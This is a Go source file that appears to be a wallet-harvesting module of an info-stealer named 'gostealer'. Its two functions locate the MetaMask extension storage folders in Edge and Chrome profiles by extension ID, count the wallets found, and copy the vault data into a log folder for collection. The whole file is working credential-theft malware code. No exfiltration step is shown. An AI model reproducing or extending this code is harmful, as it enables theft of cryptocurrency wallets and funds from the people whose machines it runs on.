package wallets

import (
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
)

func CopyMetamaskEdge(browserPath, logFolderPath string) {
	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm")); !os.IsNotExist(err) {
		utils.WalletAmount++
	}
	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")); !os.IsNotExist(err) {
		utils.WalletAmount++
	}
	// ____________________
	//metamask edge version
	metamaske := path.Join(browserPath, "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm")

	utils.CopyFolderFiles(metamaske, path.Join(logFolderPath, "wallets", "metamask_edge"))

	//metamask chrome version
	metamaskc := path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")

	utils.CopyFolderFiles(metamaskc, path.Join(logFolderPath, "wallets", "metamask_edge_chromeversion"))
}

func CopyMetamaskChrome(browserPath, logFolderPath string) {
	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")); !os.IsNotExist(err) {
		utils.WalletAmount++
	}
	//________________
	metamask := path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")

	utils.CopyFolderFiles(metamask, path.Join(logFolderPath, "wallets", "metamask_chrome"))
}
